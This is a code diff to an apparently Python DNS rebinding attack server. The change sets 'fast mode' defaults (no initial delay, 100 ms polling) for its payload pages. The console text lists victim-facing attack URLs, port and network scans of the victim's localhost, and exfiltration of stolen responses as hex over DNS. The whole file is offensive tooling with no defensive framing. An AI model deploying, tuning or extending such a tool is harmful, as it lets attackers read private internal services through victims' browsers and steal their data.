@@ -578,12 +578,11 @@ class PayloadResource(resource.Resource):
 <h2>Available Payloads</h2>
 <div class="payload">
     <h3><a href="/single">/single</a> - Single Target</h3>
-    <p>Steal response from one target. Configure with query params:</p>
-    <code>/single?path=/admin&delay=70000&interval=2000&attempts=60</code>
+    <p>Steal response from one target. Defaults to fast mode (instant polling).</p>
+    <code>/single?path=/admin</code>
     <p style="font-size: 0.9em; color: #888; margin-top: 8px;">
-        delay=initial wait (ms, default 70000 for Chrome DNS cache)<br>
-        interval=poll interval (ms, default 2000)<br>
-        attempts=max tries (default 60)
+        <b>Defaults (fast):</b> delay=0, interval=100ms, attempts=300 (30s)<br>
+        <b>Browser mode:</b> ?delay=70000&amp;interval=2000&amp;attempts=60
     </p>
 </div>
 
@@ -639,16 +638,16 @@ class PayloadPage(resource.Resource):
         # Parse query params
         args = {k.decode(): v[0].decode() for k, v in request.args.items()}
         
-        if self.path == 'single':
+        if self.path in ('single', 'fast'):
             # Port auto-detected from URL, fallback to param, fallback to 80
             port = int(args.get('port', 80))  # Only used as JS fallback
             path = args.get('path', '/')
-            # Default: 70s initial delay (Chrome DNS cache is ~60s)
-            delay = int(args.get('delay', 70000))
-            # Default: poll every 2s
-            poll_interval = int(args.get('interval', 2000))
-            # Default: 60 attempts (~2 min of polling after initial delay)
-            max_attempts = int(args.get('attempts', 60))
+            
+            # Default: fast mode (no delay, rapid polling)
+            # For slow browsers, use ?delay=70000&interval=2000&attempts=60
+            delay = int(args.get('delay', 0))
+            poll_interval = int(args.get('interval', 100))
+            max_attempts = int(args.get('attempts', 300))
             
             html = PayloadGenerator.single_target(
                 domain=domain,
@@ -1388,6 +1387,10 @@ class CommandProtocol(LineReceiver):
         self.send(f'    /portscan  - Scan ports on victim localhost')
         self.send(f'    /netscan   - Scan internal network')
         self.send('')
+        self.send('  Defaults (fast mode):')
+        self.send('    delay=0ms, interval=100ms, attempts=300 (30s total)')
+        self.send('    For slow browsers: ?delay=70000&interval=2000&attempts=60')
+        self.send('')
         static_host = config.static_hosts[0] if config.static_hosts else f"static.{config.domain}"
         self.send('  Attack URLs (send to victim):')
         self.send(f'    http://{static_host}:{http_port}/single')
@@ -1396,10 +1399,9 @@ class CommandProtocol(LineReceiver):
         self.send('')
         self.send('  How it works:')
         self.send('    1. Victim visits URL → loads from YOUR server')
-        self.send('    2. Page waits for DNS TTL to expire')
-        self.send('    3. JS fetches "same origin" → DNS now returns rebind IP')
-        self.send('    4. Browser fetches from victim localhost!')
-        self.send('    5. Data exfiltrated via DNS (hex encoded)')
+        self.send('    2. JS polls rapidly (default: every 100ms)')
+        self.send('    3. When DNS rebinds → fetch hits internal target')
+        self.send('    4. Data exfiltrated via DNS (hex encoded)')
         self.send('')
     
     def cmd_quit(self):
